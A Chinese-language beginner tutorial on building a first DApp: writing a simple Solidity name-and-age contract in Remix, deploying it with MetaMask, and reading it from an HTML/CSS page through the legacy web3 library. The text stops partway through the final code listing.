    <content type="html"><![CDATA[<h1 id="实战-带你光速了解Dapp"><a href="#实战-带你光速了解Dapp" class="headerlink" title="实战-带你光速了解Dapp"></a>实战-带你光速了解Dapp</h1><blockquote><p>前言：跟着做就行</p></blockquote><h2 id="1-DApp实现之合约编写"><a href="#1-DApp实现之合约编写" class="headerlink" title="1.DApp实现之合约编写"></a>1.DApp实现之合约编写</h2><ul><li>打开<a href="https://remix.ethereum.org/">Remix编辑器</a></li><li>新建<code>InfoContract.sol</code>文件，并将下面合约内容Copy上去</li></ul><h3 id="编写InfoContract合约"><a href="#编写InfoContract合约" class="headerlink" title="编写InfoContract合约"></a>编写<code>InfoContract</code>合约</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: GPL-3.0<br><br>pragma solidity 0.8.0;<br><br>contract InfoContract&#123;<br>    string name;<br>    uint256 age;<br><br>    function setInfo(string memory _name,uint256 _age) public &#123;<br>        name = _name;<br>        age = _age;<br><br>    &#125;<br><br>    function getInfo() public view returns(string memory,uint)&#123;<br>        return (name,age);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-DApp实现之前端编写"><a href="#2-DApp实现之前端编写" class="headerlink" title="2.DApp实现之前端编写"></a>2.DApp实现之前端编写</h2><h3 id="2-1创建一个新文件夹Dapp"><a href="#2-1创建一个新文件夹Dapp" class="headerlink" title="2.1创建一个新文件夹Dapp"></a>2.1创建一个新文件夹<code>Dapp</code></h3><p>并用VScode或者Atom打开该文件夹（选择你自己使用的编辑器即可）</p><h3 id="2-2Dapp中创建index-html和index-css"><a href="#2-2Dapp中创建index-html和index-css" class="headerlink" title="2.2Dapp中创建index.html和index.css"></a>2.2<code>Dapp</code>中创建<code>index.html</code>和<code>index.css</code></h3><p><font color="red">index.html</font></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Dapp Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;index.css&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><br>            First Dapp<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;info&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>姓名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>年龄：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;age&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><font color="blue">index.css</font></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f0f0f0</span>;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">2em</span>;<br>    <span class="hljs-attribute">font-family</span>: <span class="hljs-string">&#x27;Raleway&#x27;</span>,<span class="hljs-string">&#x27;Source Sans Pro&#x27;</span>,<span class="hljs-string">&#x27;Arial&#x27;</span>;<br><br>&#125;<br><br><span class="hljs-selector-class">.container</span>&#123;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">40%</span>;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;<br>&#125;<br><br><span class="hljs-selector-tag">label</span>&#123;<br>    <span class="hljs-attribute">display</span>: block;<br>    <span class="hljs-attribute">margin-bottom</span>:<span class="hljs-number">10px</span>;<br>&#125;<br><br><span class="hljs-selector-tag">input</span>&#123;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">50%</span>;<br>    <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">1em</span>;<br>&#125;<br><br><span class="hljs-selector-tag">button</span>&#123;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">2em</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">1em</span> <span class="hljs-number">4em</span>;<br>    <span class="hljs-attribute">display</span>: block;<br>&#125;<br><br><span class="hljs-selector-id">#info</span>&#123;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">1em</span>;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#fff</span>;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">1em</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-3效果图预览"><a href="#2-3效果图预览" class="headerlink" title="2.3效果图预览"></a>2.3效果图预览</h3><p><img src="/2022/09/07/%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%85%89%E9%80%9F%E4%BA%86%E8%A7%A3DAPP/%E6%95%88%E6%9E%9C%E5%9B%BE.png" alt="效果图"></p><h2 id="3-DApp实现之Web3与合约交互"><a href="#3-DApp实现之Web3与合约交互" class="headerlink" title="3. DApp实现之Web3与合约交互"></a>3. DApp实现之Web3与合约交互</h2><h3 id="3-1安装web3库"><a href="#3-1安装web3库" class="headerlink" title="3.1安装web3库"></a>3.1安装web3库</h3><blockquote><p>推荐使用第三种方法，因为不用安装任何环境</p></blockquote><h4 id="Node"><a href="#Node" class="headerlink" title="- Node"></a>- Node</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install web3<br></code></pre></td></tr></table></figure><h4 id="Yarn"><a href="#Yarn" class="headerlink" title="- Yarn"></a>- Yarn</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">yarn add web3<br></code></pre></td></tr></table></figure><h4 id="CDN"><a href="#CDN" class="headerlink" title="- CDN"></a>- CDN</h4><blockquote><p><font color="Red">由于以太坊舍弃了web3的脚本使用方法，所以这里我们临时使用替代脚本</font></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;!-- <span class="hljs-title class_">The</span> legacy-web3 script must run <span class="hljs-variable constant_">BEFORE</span> your other scripts. --&gt;<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://unpkg.com/@metamask/legacy-web3@latest/dist/metamask.web3.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br>    &lt;!-- 或者用 --&gt;<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://unpkg.com/@metamask/legacy-web3@latest/dist/metamask.web3.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong>Tip:</strong> 若web3难以安装，建议参考这篇文章<a href="https://blog.csdn.net/weixin_52628792/article/details/123866412">解决npm安装web3模块失败问题</a></p><h3 id="3-2-Web3调用合约"><a href="#3-2-Web3调用合约" class="headerlink" title="3.2 Web3调用合约"></a>3.2 Web3调用合约</h3><blockquote><p>参考文档：<a href="https://web3js.readthedocs.io/en/v1.7.4/web3-eth-contract.html#new-contract">web3.eth.contract</a></p></blockquote><h4 id="3-2-1获取合约的abi"><a href="#3-2-1获取合约的abi" class="headerlink" title="3.2.1获取合约的abi"></a>3.2.1获取合约的abi</h4><p><code>什么是abi？</code>可以去复习之前的课程</p><ul><li>回到Remix编辑器的编译器界面</li><li>点击右下角的<code>Compilation Details</code>按钮</li></ul><p><img src="/2022/09/07/%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%85%89%E9%80%9F%E4%BA%86%E8%A7%A3DAPP/remix1.png" alt="remix1"></p><ul><li>复制abi内容</li></ul><p><img src="/2022/09/07/%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%85%89%E9%80%9F%E4%BA%86%E8%A7%A3DAPP/abi.png" alt="abi"></p><h4 id="3-2-2部署合约"><a href="#3-2-2部署合约" class="headerlink" title="3.2.2部署合约"></a>3.2.2部署合约</h4><blockquote><p><font color="red">需要保证你的小狐狸钱包里有bnb余额</font></p></blockquote><ol><li>选择<code>Injected Web3</code>环境，点击<code>Deploy</code>部署</li></ol><p><img src="/2022/09/07/%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%85%89%E9%80%9F%E4%BA%86%E8%A7%A3DAPP/deploy.png" alt="deploy"></p><ol start="2"><li>在小狐狸钱包中点击确认，交上部署合约的gas费</li></ol><img src="/2022/09/07/%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%85%89%E9%80%9F%E4%BA%86%E8%A7%A3DAPP/mask.png" alt="mask" style="zoom:50%;"><ol start="3"><li>部署成功！</li></ol><p><img src="/2022/09/07/%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%85%89%E9%80%9F%E4%BA%86%E8%A7%A3DAPP/success.png" alt="success"></p><ol start="4"><li>在左侧已部署合约中Copy合约地址</li></ol><p><img src="/2022/09/07/%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%85%89%E9%80%9F%E4%BA%86%E8%A7%A3DAPP/copy.png" alt="copy"></p><p>我的合约地址是<code>0x528f48F5EbCbf25061e8814328A0073294ED58Cb</code></p><h4 id="3-2-3编写Script脚本"><a href="#3-2-3编写Script脚本" class="headerlink" title="3.2.3编写Script脚本"></a>3.2.3编写Script脚本</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>    <br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(web3)<br>        web3.<span class="hljs-title function_">setProvider</span>(<span class="hljs-string">&#x27;ws://localhost:8545&#x27;</span>);<br>        <span class="hljs-comment">//获取介绍内容</span><br>        <span class="hljs-keyword">const</span> introduction = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;info&#x27;</span>)<br>       <br>         <span class="hljs-comment">//通过abi初始化合约</span><br>        <span class="hljs-keyword">var</span> infoContract = web3.<span class="hljs-property">eth</span>.<span class="hljs-title function_">contract</span>(<br>            [&#123;<br>                    <span class="hljs-string">&quot;inputs&quot;</span>: [],<br>                    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;getInfo&quot;</span>,<br>                    <span class="hljs-string">&quot;outputs&quot;</span>: [&#123;<br>                            <span class="hljs-string">&quot;internalType&quot;</span>: <span class="hljs-string">&quot;string&quot;</span>,<br>                            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>                            <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;string&quot;</span><br>                        &#125;,<br>                        &#123;<br>                            <span class="hljs-string">&quot;internalType&quot;</span>: <span class="hljs-string">&quot;uint256&quot;</span>,<br>                            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>                            <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;uint256&quot;</span><br>                        &#125;<br>                    ],<br>                    <span class="hljs-string">&quot;stateMutability&quot;</span>: <span class="hljs-string">&quot;view&quot;</span>,<br>                    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;function&quot;</span><br>                &#125;,<br>                &#123;<br>                    <span class="hljs-string">&quot;inputs&quot;</span>: [&#123;<br>                            <span class="hljs-string">&quot;internalType&quot;</span>: <span class="hljs-string">&quot;string&quot;</span>,<br>                            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;_name&quot;</span>,<br>                            <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;string&quot;</span><br>                        &#125;,<br>                        &#123;<br>                            <span class="hljs-string">&quot;internalType&quot;</span>: <span class="hljs-string">&quot;uint256&quot;</span>,<br>                            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;_age&quot;</span>,<br>                            <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;uint256&quot;</span><br>                        &#125;<br>                    ],<br>                    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;setInfo&quot;</span>,<br>                    <span class="hljs-string">&quot;outputs&quot;</span>: [],<br>                    <span class="hljs-string">&quot;stateMutability&quot;</span>: <span class="hljs-string">&quot;nonpayable&quot;</span>,<br>                    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;function&quot;</span><br>                &#125;<br>            ]<br>        );<br><br>        <span class="hljs-comment">//通过地址实例化合约</span><br>        <span class="hljs-keyword">var</span> info = infoContract.<span class="hljs-title function_">at</span>(<span class="hljs-string">&#x27;0x528f48F5EbCbf25061e8814328A0073294ED58Cb&#x27;</span>)<br><br>        <span class="hljs-comment">//从合约获取消息</span><br>        info.<span class="hljs-title function_">getInfo</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">error, result</span>) &#123;<br>            <span class="hljs-keyword">if</span> (!error) &#123;<br>                <span class="hljs-comment">//修改介绍内容</span><br>                introduction.<span class="hljs-property">innerHTML</span> = result[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;(&#x27;</span> + result[<span class="hljs-number">1</span>] + <span class="hljs-string">&#x27;years old)&#x27;</span><br>            &#125;<br>        &#125;)<br>      <br>        <br>    &lt;/script&gt;<br></code></pre></td></tr></table></figure><h4 id="3-2-4-更改合约信息"><a href="#3-2-4-更改合约信息" class="headerlink" title="3.2.4 更改合约信息"></a>3.2.4 更改合约信息</h4><p><strong>注意</strong>仍要在<code>injected web3</code>环境下更改，并且这将会收取一定的gas费用，小狐狸钱包上点击确认即可！</p><p><img src="/2022/09/07/%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%85%89%E9%80%9F%E4%BA%86%E8%A7%A3DAPP/change.png" alt="change"></p><p><strong>更改成功！</strong></p><p><img src="/2022/09/07/%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%85%89%E9%80%9F%E4%BA%86%E8%A7%A3DAPP/change_success.png" alt="change_success"></p><h4 id="3-2-5前端显示"><a href="#3-2-5前端显示" class="headerlink" title="3.2.5前端显示"></a>3.2.5前端显示</h4><p><img src="/2022/09/07/%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%85%89%E9%80%9F%E4%BA%86%E8%A7%A3DAPP/display1.png" alt="display1"></p><p><font color="red">恭喜你！至此你已经实现了人生中第一次与智能合约的交互！</font></p><h2 id="💎举一反三"><a href="#💎举一反三" class="headerlink" title="💎举一反三"></a>💎举一反三</h2><p>我们通过调用该合约的<code>getInfo()</code>的方法，获取了我们设置的信息，并让它在前端显示出来。那么该如何通过前端去更新我们智能合约的信息呢？</p><h3 id="index-html全部代码"><a href="#index-html全部代码" class="headerlink" title="index.html全部代码"></a><font color="red">index.html</font>全部代码</h3><blockquote><p>index.css无需改动，用之前的即可</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Dapp Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;index.css&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://unpkg.com/@metamask/legacy-web3@latest/dist/metamask.web3.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><br>            First Dapp<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;info&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>姓名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>年龄：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;age&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>更新<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(web3)</span><br><span class="language-javascript">        web3.<span class="hljs-title function_">setProvider</span>(<span class="hljs-string">&#x27;ws://localhost:8545&#x27;</span>);</span><br><span class="language-javascript">        <span class="hljs-comment">//获取介绍内容</span></span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> introduction = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;info&#x27;</span>) </span><br><span class="language-javascript">        </span><br><span class="language-javascript">        <span class="hljs-comment">//通过abi初始化合约</span></span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> infoContract = web3.<span class="hljs-property">eth</span>.<span class="hljs-title function_">contract</span>(</span><br><span class="language-javascript">            [&#123;</span><br><span class="language-javascript">                    <span class="hljs-string">&quot;inputs&quot;</span>: [],</span><br><span class="language-javascript">                    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;getInfo&quot;</span>,</span><br><span class="language-javascript">                    <span class="hljs-string">&quot;outputs&quot;</span>: [&#123;</span><br><span class="language-javascript">                            <span class="hljs-string">&quot;internalType&quot;</span>: <span class="hljs-string">&quot;string&quot;</span>,</span><br><span class="language-javascript">                            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,</span><br><span class="language-javascript">                            <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;string&quot;</span></span><br><span class="language-javascript">                        &#125;,</span><br><span class="language-javascript">                        &#123;</span><br><span class="language-javascript">                            <span class="hljs-string">&quot;internalType&quot;</span>: <span class="hljs-string">&quot;uint256&quot;</span>,</span><br><span class="language-javascript">                            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,</span><br><span class="language-javascript">                            <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;uint256&quot;</span></span><br><span class="language-javascript">                        &#125;</span><br><span class="language-javascript">                    ],</span><br><span class="language-javascript">                    <span class="hljs-string">&quot;stateMutability&quot;</span>: <span class="hljs-string">&quot;view&quot;</span>,</span><br><span class="language-javascript">                    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;function&quot;</span></span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                &#123;</span><br><span class="language-javascript">                    <span class="hljs-string">&quot;inputs&quot;</span>: [&#123;</span><br><span class="language-javascript">                            <span class="hljs-string">&quot;internalType&quot;</span>: <span class="hljs-string">&quot;string&quot;</span>,</span><br><span class="language-javascript">                            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;_name&quot;</span>,</span><br><span class="language-javascript">                            <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;string&quot;</span></span><br><span class="language-javascript">                        &#125;,</span><br><span class="language-javascript">                        &#123;</span><br><span class="language-javascript">                            <span class="hljs-string">&quot;internalType&quot;</span>: <span class="hljs-string">&quot;uint256&quot;</span>,</span><br><span class="language-javascript">                            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;_age&quot;</span>,</span><br><span class="language-javascript">                            <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;uint256&quot;</span></span><br><span class="language-javascript">                        &#125;</span><br><span class="language-javascript">                    ],</span><br><span class="language-javascript">                    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;setInfo&quot;</span>,</span><br><span class="language-javascript">                    <span class="hljs-string">&quot;outputs&quot;</span>: [],</span><br><span class="language-javascript">                    <span class="hljs-string">&quot;stateMutability&quot;</span>: <span class="hljs-string">&quot;nonpayable&quot;</span>,</span><br><span class="language-javascript">                    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;function&quot;</span></span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            ]</span><br><span class="language-javascript">        );</span><br><span class="language-javascript">        </span><br><span class="language-javascript">        <span class="hljs-comment">//通过地址实例化合约</span></span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> info = infoContract.<span class="hljs-title function_">at</span>(<span class="hljs-string">&#x27;0x528f48F5EbCbf25061e8814328A0073294ED58Cb&#x27;</span>)</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-comment">//从合约获取消息</span></span><br><span class="language-javascript">        info.<span class="hljs-title function_">getInfo</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">error, result</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">if</span> (!error) &#123;</span><br><span class="language-javascript">                <span class="hljs-comment">//修改介绍内容</span></span><br><span class="language-javascript">                introduction.<span class="hljs-property">innerHTML</span> = result[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;(&#x27;</span> + result[<span class="hljs-number">1</span>] + <span class="hljs-string">&#x27;years old)&#x27;</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">      </span><br><span class="language-javascript">        </span><br><span class="language-javascript">    </span><span 